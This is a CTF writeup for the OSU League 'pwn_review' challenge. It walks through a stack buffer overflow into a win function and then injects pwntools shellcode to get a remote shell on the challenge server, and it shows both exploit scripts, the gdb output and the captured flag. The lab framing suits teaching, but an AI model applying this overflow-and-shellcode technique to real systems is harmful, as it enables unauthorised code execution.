---
title: "OSU League 2020/2021 - pwn_review Writeup"
date: 2020-10-30
draft: false
description: ""
tags: ["ctf"]
---
## Writeup
A simple review challenge.  Let's see how it goes :3

So running the binary, we get some info:
```
This is a review challenge, you know the drill
Return to the win function and get the flag
gimme win function
```
Ok, so we need to return to the win function.  My guess is that this program is going to be susceptible to a buffer overflow.  Turns out it is!  After screaming at it for a bit, I was able to determine the buffer was 32 bytes, so our padding will be 40 bytes.

```
gdb-peda$ r
Starting program: /home/perchik/CTF/osuleague/week4/pwn_review
This is a review challenge, you know the drill
Return to the win function and get the flag
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
```
Sweet, we crashed, and if we look at RBP, we can see we have overwritten it with our Bs. `RBP: 0x4242424242424242 ('BBBBBBBB')`
That means whatever comes next will overwrite the instruction pointer, so we can return to wherever we want!

So let's actually find the address we want to return to.  We can use `objdump -d pwnreview | grep win` to find the location of the win function.
`0000000000400577 <win>:`

Great. So we know our padding will be 40 bytes, and we have the address.  So let's put what we have together so far in python:

```python
from pwn import *
import os, sys
#io = process('./pwn_review')
io = remote('ctf.ropcity.com', 31337)

context(arch = "amd64")

padding = b"A"*40
win = p64(0x400577)
payload = padding + win

log.info(payload)

io.sendline(payload)
io.interactive()
```
And running it we get:
```
[+] Opening connection to ctf.ropcity.com on port 31337: Done
[*] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw\x05@\x00\x00\x00\x00\x00
[*] Switching to interactive mode
This is a review challenge, you know the drill
Return to the win function and get the flag
nice! I'll execute any shellcode you give me now
$ booop?
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to ctf.ropcity.com port 31337
[*] Got EOF while sending in interactive
```

Hmm, looks like we aren't done quite yet.  We are give a prompt to enter some shell code.  So let's add a few more lines to our exploit that will spawn a shell for us.
```python
from pwn import *
import os, sys
#io = process('./pwn_review')
io = remote('ctf.ropcity.com', 31337)

context(arch = "amd64")

padding = b"A"*40
win = p64(0x400577)

shell = shellcraft.sh() #Pwntools shellcraft OP
shellcode = asm(shell)

payload = padding + win
log.info(payload)

io.sendline(payload)

io.recvuntil("you give me now")

io.sendline(shellcode)
io.interactive()
```

And running it we get a shell!:

```
[+] Opening connection to ctf.ropcity.com on port 31337: Done
[*] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw\x05@\x00\x00\x00\x00\x00
[*] Switching to interactive mode

$ ls
flag
pwn_review
$ cat flag
osu{pwnt00ls_i$_Ch3A7iNG}
```

This was a pretty sick review covering the stuff we have learned so far! GG